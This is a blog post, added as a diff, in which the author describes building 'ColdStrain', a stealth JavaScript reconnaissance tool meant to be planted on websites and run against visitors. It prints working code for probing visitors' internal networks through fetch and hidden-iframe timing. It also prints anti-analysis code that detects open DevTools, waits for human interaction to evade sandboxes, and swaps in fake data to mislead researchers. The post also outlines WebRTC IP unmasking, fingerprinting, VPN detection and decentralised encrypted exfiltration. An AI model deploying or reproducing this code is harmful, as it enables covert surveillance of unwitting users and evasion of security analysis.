@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>A Nice Dose of Web-based Reconnaissance</title>
+</head>
+
+<body>
+  <h1>A Nice Dose of Web-based Reconnaissance</h1>
+  <p>Published: 2026 Apr 19</p>
+  <p>So after the leak and stuff, i had developed a feeling for security and stuff, and a fter a bit of thinking i had decided to make a web-based reconaissance tool(well legally a PoC) which i had decided to be able to aggressively gather data and would work in background in maximum stealth.</p>
+            <p>after staring at the wall for sometime, i had developed the bigger picture, that the tool would be in the form of a JS script Or a library which would be pretty easy to plug in a website, basically that the tool could be planted easily in a website which would then start doing the recon on each user or the target whi visited it. but for this i had to exploit something in the browser,as this should be stealty and aggressive and shouldn't be like nMAP which anybody who know a bit of networking could detect with a nice firewall. so after some digging, i decided that i'd use 'the supreme IP leaker of browsers', <code>WebRTC</code>, and here i would exploit the flaws of WebRTC to get the recon working and use other browser APIs. and here the tool would establish a dummy WebRTC channel with the target which then would increase the trust of the browser and then would harvest as much as possible through that.</p>
+            <p>then i started with the classic IP leaker feature, which RTC was notoriously known for. unfortunately the latest versions of Chrome and Safari and hardened ones like Firefox and Brave had had enough of WebRTC and had either sidelined the API or had patched the issue, and here i couldn't do the simple raw local IP grab as the vendors had now used a thing called <code>multicastDNS</code> or <code>mDNS(RFC6762)</code>, and this masks the local IP with an encoded string with a <code>.local</code> suffix, hence now unreadable for the tool and i knew about the age old technique of getting media permission to force the browser into unmasking the IP(here the browser is tricked as usually WebRTC and media permission usually means that a video con or something is going on and the browser will unmask the IP for <i>'the best possible streaming quality'</i>) but currently it was only working smoothly for Chrome and Chromium based browsers and stuff like Firefox and Safari had made that, even if media permission is given unmasking wouldn't be done default unless with some enterprise config, so I had to add the 'loud' feature of media permission, but it was kinda a partial win for me as most people use Chrome and most people give media permissions and even if it's not given the other info would still be there and the users would just shrug it off as 'normal'.</p>
+            <p>then i added the other features like the detection of VPN through using <code>WebGL</code>to find if the target's GPU, and as most servers use GPUs like SwiftShader and home PCs use stuff like an Nvidia RTX, it would be a very strong identifier. and then i added features which used things like <code>Canvas Fingerprinting</code> and <code>WebCodecs</code> to get hardware-level info.</p>
+            <p>one of my favorite processes in this tool was the LAN mapping process, it was not like your usual LAN mapping where you have a bunch of common ISP IPs which you use to hit the router. but here it's pretty clever, the script starts with a hardcoded <code>Set</code> of the most common default gateways used by home and corporate routers.</p>
+            <pre>192.168.1.1 192.168.0.1 10.0.0.1</pre>
+            <p>then it's the 'adaptation' to the environment, it looks at the local IP it harvested during the WebRTC phase(<code>this.localInterfaces</code>), then it uses the <code>.split('.')</code> method:</p>
+            <ol>
+            <li>it takes the local IP(eg., 192.168.50.15).</li>
+            <li>it splits it into four parts(octets): ['192', '168', '50', '15'].</li>
+            <li>it slices off the first three: ['192', '168', '50'].</li>
+            <li>It rejoins them to create the subnet prefix: 192.168.50.</li>
+            </ol>
+            <p>once it has your subnet, it guesses where the router or other infrastructure might be by appending common suffixes: .1, .254, and .100. So, if your IP is 192.168.50.15, it automatically adds 192.168.50.1, 192.168.50.254, and 192.168.50.100 to its target list.</p>
+            <p>but the script doesn't just ping the IPs(which JS usually can't do). it uses two "error-based" detection methods, in the first method it attempts a <code>fetch()</code> to the target IP with the <code>no-cors</code> mode. even though the browser blocks the script from reading the content of the router's login page (due to CORS), the script can still see <b>how</b> the request failed. and in the result, if it gets a "Connection Refused" error quickly, it knows a device is there. if it simply "Times Out," it assumes no device is at that IP. in the second method, as this is is a fallback, it is even more subtle. It creates a hidden <code>iframe</code> and points its <code>src</code> to the target IP on an obscure port (like <code>:31337</code>). it starts a timer using <code>performance.now()</code>. and in the detection, a live host will respond (even with an "Error: Reset" or "Refused") much faster than a non-existent host. if the <code>onerror</code> fires in under 1.4 seconds, the script flags that IP as <b>"ALIVE (Timing Bypass)."</b> by doing this, the script builds a map of the internal network without ever needing specialized permissions or complex pattern matching. It's essentially using the browser's own security errors as a radar.</p>
+<pre><code class="language-javascript">// Phase 1: Establish baseline and adapt to discovered local subnet
+const gateways = new Set(['192.168.1.1', '192.168.0.1', '10.0.0.1']);
+
+this.localInterfaces.forEach(ip => {
+    // Ensure we have a raw IPv4 address, not a masked mDNS (.local)
+    if (ip.includes('.') &amp;&amp; !ip.endsWith('.local')) {
+        const octets = ip.split('.');
+        if (octets.length === 4) {
+            // Slice the first three octets to get the subnet prefix
+            const subnet = octets.slice(0, 3).join('.');
+            
+            // Append common gateway addresses
+            gateways.add(\`\${subnet}.1\`);   // Primary router guess
+            gateways.add(\`\${subnet}.254\`); // Secondary common gateway
+            gateways.add(\`\${subnet}.100\`); // Common DHCP start range
+        }
+    }
+});
+
+const targetList = Array.from(gateways);</code></pre>
+<pre><code class="language-javascript">// Phase 2: Probe targets using Fetch timing
+const pingViaFetch = async (ip) => {
+    const controller = new AbortController();
+    // Set a strict 1200ms timeout. Anything slower is considered an empty IP.
+    const timeoutId = setTimeout(() => controller.abort(), 1200); 
+
+    try {
+        const start = performance.now();
+        await fetch(\`http://\${ip}\`, {
+            mode: 'no-cors',
+            cache: 'no-cache',
+            signal: controller.signal
+        });
+        const duration = performance.now() - start;
+        clearTimeout(timeoutId);
+        
+        fetchActiveHosts.push({ ip: ip, ms: Math.round(duration), status: "ALIVE (Fetch Responded)" });
+    } catch (err) {
+        clearTimeout(timeoutId);
+        
+        // If the error isn't our manual abort timeout, the device actively refused the connection quickly
+        if (err.name !== 'AbortError') {
+            fetchActiveHosts.push({ ip: ip, status: "ALIVE (Fetch Refused)" });
+        }
+    }
+};</code></pre>
+<pre><code class="language-javascript">// Phase 3: Probe targets using Iframe Navigation Timing
+const probeIp = async (ip) => {
+    return new Promise((resolve) => {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none'; // Keep it hidden from the user
+        
+        const start = performance.now();
+        
+        // Failsafe timeout to clean up the DOM
+        const timeoutId = setTimeout(() => {
+            if (document.body.contains(iframe)) document.body.removeChild(iframe);
+            resolve(); 
+        }, 1500);
+
+        // Listen for both onload and onerror to catch any response
+        iframe.onload = iframe.onerror = () => {
+            const duration = performance.now() - start;
+            clearTimeout(timeoutId);
+            
+            if (document.body.contains(iframe)) document.body.removeChild(iframe);
+
+            // If the browser threw an error faster than 1400ms, a device actively closed the connection
+            if (duration &lt; 1400) {
+                activeHosts.push({ ip: ip, ms: Math.round(duration), status: "ALIVE (Timing Bypass)" });
+            }
+            resolve();
+        };
+
+        document.body.appendChild(iframe);
+        // Point to the target IP on a port unlikely to be open
+        iframe.src = \`http://\${ip}:31337\`; 
+    });
+};</code></pre>
+   <p>then i added the other features like NAT topology identification feature, then were several sophisticated anti-analysis features, the first was a <code>armOnMultiInteraction</code> method which ensured the payload doesn't fire in an automated sandbox (like VirusTotal or Joe Sandbox) as it required a stateful response human response of <code>mousemove</code>-><code>scroll</code>-><code>click</code>. then it verifies the <code>isTrusted</code> property on the click event to ensure it wasn't a programmatically generated click by a clanker, then there was a feature for <b>DevTools</b> detection where the code records the exact millisecond before and after a debugger; statement using <code>performance.now()</code>. in a normal environment, the script ignores this and executes it in less than a millisecond. If DevTools is open, the script halts execution. If the time delta exceeds 100ms, the script assumes a human is inspecting the code, and then a Chromium specific thing, the script creates a custom object with a modified <code>toString()</code> method that sets a flag (<code>detected = true</code>) when called. it then logs this object to the console using <code>console.log('%c', detector);</code>. in Chromium-based browsers (Chrome, Edge), the console automatically evaluates and stringifies objects to display them. if the console is closed, the object is never evaluated, and the trap remains untriggered. the second one is deceptive 'noise' method, where instead of terminating the script when analysis is detected (which is a strong indicator of malicious intent), ColdStrain utilizes <b>Dynamic Method Swapping</b> to feed the researcher fake data.</p>
+   <pre><code class="language-javascript">async _isDevToolsOpen() {
+        // Trap 1: Execution pause (Works across all browsers)
+        const start = performance.now();
+        debugger; 
+        const end = performance.now();
+        if (end - start &gt; 100) return true;
+
+        // Trap 2: toString() evaluation (Only safe to run on Chromium-based browsers)
+        const isChromium = !!window.chrome;
+        if (isChromium) {
+            let detected = false;
+            const detector = {
+                toString: () => { detected = true; return 'detector'; }
+            };
+            console.log('%c', detector); 
+            return detected;
+        }
+    }</code></pre>
+<pre><code class="language-javascript">this._noiseFunctions = {
+    harvest: () => Promise.resolve({ error: "ERR_ENCRYPT_FAIL", nonce: Math.random().toString(36) }),
+    syncToMesh: () => {},
+    getDeepMediaTelemetry: () => Promise.resolve({ status: "IDLE", hardware: "GENERIC_PnP" })
+};</code></pre>
+<pre><code class="language-javascript">async _checkIntegrity() {
+    const isOpen = await this._isDevToolsOpen();
+
+    if (isOpen &amp;&amp; !this._isShielded) {
+        this._applyNoise();
+    } else if (!isOpen &amp;&amp; this._isShielded) {
+        this._restoreLogic();
+    }
+}
+
+_applyNoise() {
+    this._isShielded = true;
+
+    Object.keys(this._noiseFunctions).forEach(m => {
+        this[m] = this._noiseFunctions[m];
+    });
+}</code></pre>
+<pre><code class="language-javascript">armOnMultiInteraction() {
+    let interactionState = 0;
+    let sequenceTimeout = null;
+
+    const resetSequence = () => {
+        if (interactionState &gt; 0) {
+            
+        }
+        interactionState = 0;
+        if (sequenceTimeout) {
+            clearTimeout(sequenceTimeout);
+            sequenceTimeout = null;
+        }
+    };
+
+    const triggerRecon = async () => {
+        console.log("[!] Complex human interaction verified. Executing payload...");
+        
+        window.removeEventListener('mousemove', handleMouse);
+        window.removeEventListener('scroll', handleScroll);
+        window.removeEventListener('click', handleClick);
+        clearTimeout(sequenceTimeout);
+        
+        try {
+            await this.syncToMesh();
+            
+        } catch (error) { }
+    };
+
+    const handleMouse = () => {
+        if (interactionState === 0) {
+            interactionState = 1; 
+            sequenceTimeout = setTimeout(resetSequence, 5000); 
+        }
+    };
+
+    const handleScroll = () => {
+        if (interactionState === 1) {
+            interactionState = 2; 
+        }
+    };
+
+    const handleClick = (event) => {
+        if (interactionState === 2) {
+            if (event.isTrusted &amp;&amp; (event.clientX !== 0 || event.clientY !== 0)) {
+                triggerRecon();
+            } else {
+                resetSequence();
+            }
+        }
+    };
+
+    window.addEventListener('mousemove', handleMouse);
+    window.addEventListener('scroll', handleScroll, { passive: true }); 
+    window.addEventListener('click', handleClick);
+}</code></pre>
+   <p>then it was the logic for the exfiltration of the data harvested to the fetcher or the dashboard which would be a site, and the thing i did made it extremely difficult to block the data transmission, as i used <code>Gun.js</code> database for the job, and because of this the whole thing would be decentralized, and instead of sending data to a central C2 server that can be easily blacklisted by DNS, it used a decentralized graph database. and before exfiltration, it uses the Web Crypto API to perform a hybrid encryption (RSA-OAEP for the key wrap and AES-GCM for the payload chunks). this ensured that even if the network traffic is captured, the data remained unreadable without the private key.</p>
+             <p>but then i found that these techniques or at least the ones which leaked important stuff, could be mitigated in the modern web, so i made it a bit more robust, in which i added more newer and more subtle fallback features for several features which made the whole thing even more robust and difficult to mitigate, like i added the <code>WebGPU</code> fingerprinting as a fallback for WebGL, made the VPN detection a multi feature process where different ways where used to get the data for the VPN detection,as a step by step process and added a new <code>MTU</code> analysis feature with <code>WebTransport</code> which more difficult to catch.</p>
+             <p>and with all these stuff, and 5 days of work, i created ColdStrain and ngl it was pretty sophisticated and effective for a web-based reconaissance tool....dw i didn't use it in this site, i really value privacy this was just a PoC for seeing how much of we could leak from a browser if we asked nicely.</p>
+</body>
+
+</html>
